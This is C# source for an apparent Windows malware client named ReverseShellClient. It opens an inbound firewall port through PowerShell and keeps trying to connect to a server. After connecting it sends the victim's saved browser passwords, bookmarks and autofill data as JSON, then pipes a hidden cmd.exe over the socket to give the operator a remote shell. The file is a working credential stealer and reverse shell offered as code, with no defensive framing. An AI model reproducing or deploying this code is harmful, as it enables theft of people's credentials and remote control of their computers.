using Newtonsoft.Json;
using Stealer;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using static Stealer.Common;

namespace ReverseShellClient
{
    class Program
    {
        static StreamWriter streamWriter;
        static TcpClient tcpClient;
        static NetworkStream networkStream;
        static StreamReader streamReader;
        static Process processCmd;
        static StringBuilder strInput;

        static void Main(string[] args)
        {
            int port = args.Length > 0 ? int.Parse(args[0]) : 6666;
            OpenPortAutomatically(6666);
            string[] ips = {
                "127.0.0.1"
            };
            int ipIndex = 0;
         
            while (true)
            {
                string tryIp = ips[ipIndex];
                ipIndex = (ipIndex + 1) % ips.Length;
                Console.WriteLine($"Trying to connect to {tryIp} on port {port}");

                ConnectToServer(tryIp, port);
                System.Threading.Thread.Sleep(1200);
              
            }
        }

        private static void ConnectToServer(string ip, int port)
        {
            tcpClient = new TcpClient();
            tcpClient.SendBufferSize = 2048;
            strInput = new StringBuilder();

            try
            {
                IPAddress ipAdress = IPAddress.Parse(ip);
                tcpClient.Connect(ipAdress, port);

                Console.WriteLine("Connected");

                networkStream = tcpClient.GetStream();
                streamReader = new StreamReader(networkStream);
                streamWriter = new StreamWriter(networkStream);
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
                return;
            }

            SendAllInformation();

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardError = true;
            processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            processCmd.Start();
            processCmd.BeginOutputReadLine();

           

            while (true)
            {
                try
                {
                   

                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0)
                    {
                        StopServer();
                    }
                    if (strInput.ToString().LastIndexOf("exit") >= 0)
                    {
                        throw new ArgumentException();
                    }

                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }
        private static void Cleanup()
        {
            try
            {
                processCmd.Kill();
            }
            catch (Exception)
            {
            };

            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private static void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }
        private static void OpenPortAutomatically(int port)
        {
            string command = $"New-NetFirewallRule -DisplayName \"Open port {port}\" -Direction Inbound -Protocol TCP -LocalPort {port} -Action Allow\r\n";
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    RedirectStandardInput = true,
                    CreateNoWindow = false,  
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden  
                };

                using (Process process = new Process())
                {
                    process.StartInfo = psi;
                    process.Start();

                    process.StandardInput.WriteLine(command);
                    process.StandardInput.Close();

                    string output = process.StandardOutput.ReadToEnd();
                    string errors = process.StandardError.ReadToEnd();

                    Console.WriteLine("Result executing command:");
                    Console.WriteLine(output);

                    if (!string.IsNullOrEmpty(errors))
                    {
                        Console.WriteLine("Error:");
                        Console.WriteLine(errors);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error during executing: " + ex.Message);
            }
        }
        private static void SendDataToServer(string dataType, string data)
        {
            Console.WriteLine(data);
            try
            {
                streamWriter.WriteLine($"{dataType}:{data}");
                streamWriter.Flush();
            }
            catch (Exception)
            {
                Cleanup();
            }
        }


        private static void SendAllInformation()
        {
            List<Password> passwords = Passwords.Get();
            List<Bookmark> bookmarks = Bookmarks.Get();
            List<AutoFill> autofillData = Autofill.Get();

            var combinedData = new
            {
                Passwords = passwords,
                Bookmarks = bookmarks,
                Autofill = autofillData
            };
            streamWriter.WriteLine(JsonConvert.SerializeObject(combinedData));
        }



    }

}
